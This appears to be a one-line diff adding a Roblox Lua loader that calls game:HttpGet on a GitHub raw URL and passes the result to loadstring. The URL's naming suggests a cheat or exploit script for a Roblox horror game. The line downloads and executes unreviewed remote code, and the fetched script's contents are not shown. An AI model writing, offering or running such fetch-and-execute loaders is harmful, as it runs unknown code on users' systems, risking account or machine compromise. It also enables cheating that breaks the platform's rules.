@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Unitetrumake/loaders/main/loaders/it-wants-in-horror-spam2-hd6uzsjemb2j5j.lua"))()
